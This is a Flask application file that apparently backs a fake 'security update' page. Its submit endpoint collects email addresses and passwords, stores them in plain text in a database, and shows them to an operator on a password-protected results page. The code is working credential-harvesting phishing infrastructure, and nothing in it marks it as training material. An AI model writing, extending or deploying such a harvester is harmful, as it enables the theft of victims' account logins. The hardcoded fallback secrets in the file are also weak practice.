import os
from datetime import datetime, timezone

from flask import Flask, jsonify, redirect, render_template, request, session, url_for

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "demo-secret-key")

ADMIN_USER = os.environ.get("ADMIN_USER", "alix")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "***REDACTED***")

def get_db_connection():
    import psycopg2

    return psycopg2.connect(
        host=os.environ.get("DB_HOST", "db"),
        port=os.environ.get("DB_PORT", "5432"),
        dbname=os.environ.get("DB_NAME", "securityupdate"),
        user=os.environ.get("DB_USER", "securityupdate"),
        password=os.environ.get("DB_PASSWORD", "securityupdate"),
    )


def store_submission(email_value: str, password_value: str) -> None:
    created_at = datetime.now(timezone.utc).replace(microsecond=0).isoformat()

    with get_db_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                """
                INSERT INTO submissions (email_value, password_value, created_at)
                VALUES (%s, %s, %s)
                """,
                (email_value, password_value, created_at),
            )
        conn.commit()


def is_admin_authenticated() -> bool:
    return session.get("admin_authenticated", False)


@app.route("/")
def index():
    return render_template("index.html", cache_bust="v5")


@app.route("/admin", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""
        if username == ADMIN_USER and password == ADMIN_PASSWORD:
            session["admin_authenticated"] = True
            return redirect(url_for("results"))
        return render_template(
            "admin_login.html",
            error="Identifiants invalides. Réessayez.",
            cache_bust="v5",
        )
    return render_template("admin_login.html", cache_bust="v5")


@app.get("/logout")
def logout():
    session.pop("admin_authenticated", None)
    return redirect(url_for("admin_login"))


@app.post("/api/submit")
def submit():
    payload = request.get_json(silent=True) or {}
    email_value = (payload.get("email") or "").strip()
    password_value = (payload.get("password") or "").strip()

    if not email_value or not password_value:
        return jsonify({"ok": False, "message": "Email et mot de passe requis."}), 400

    store_submission(email_value, password_value)

    return jsonify({"ok": True})


@app.get("/results")
def results():
    if not is_admin_authenticated():
        return redirect(url_for("admin_login"))
    with get_db_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                """
                SELECT email_value, password_value, created_at
                FROM submissions
                ORDER BY created_at DESC
                """
            )
            rows = cur.fetchall()

    return render_template("results.html", rows=rows, cache_bust="v5")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
